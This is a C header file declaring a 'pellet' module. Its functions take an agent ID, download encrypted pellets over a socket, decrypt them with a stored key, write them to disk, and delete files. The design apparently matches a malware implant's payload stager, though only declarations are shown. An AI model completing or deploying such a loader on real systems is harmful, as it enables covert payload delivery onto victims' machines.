#include "CSocketlib.h"
#include "crypto/base64.h"
#include "crypto/hex.h"
#include "crypto/aes.h"
#include <strsafe.h>



typedef struct pellet_info {
	char* pellet_key;
	char* pellet_dir;
	char* bin_dir;
}pellet_info,*Ppellet_info;
typedef enum pellet_ec {

	pellet_ec_code_success = 0,
	pellet_ec_failed_get_file = -26,
	pellet_ec_failed_crypt_pellet_failed = -27,
	pellet_ec_get_pellet_failed = -28,
	pellet_ec_file_write_failed = -29,
	pellet_ec_file_delete_failed = -30
};

Ppellet_info form_pellet_info(Ppellet_info pinfo, char* agent_id, char* pellet_dir, char* bin_dir, char* bin_request); 
char* pellet_get_pellet(Psocket_address sock_address, char* path, PCHAR buffer_ptr, PULONG result, DWORD get_size, DWORD* written_size);
char* pellet_xcrypt_pellet(char* pellet, char* pellet_key, DWORD* pellet_size);
void free_pellet_info(Ppellet_info pinfo);
enum pellet_ec pwrite_file(char* file, DWORD file_size, char* file_wr);
enum pellet_ec pdelete_file(char* path);
char* pellet_get_post_pellet(Psocket_address sock_address, char* path, char* post_buffer, PCHAR buffer_ptr, PULONG result, DWORD get_size, DWORD* written_size);
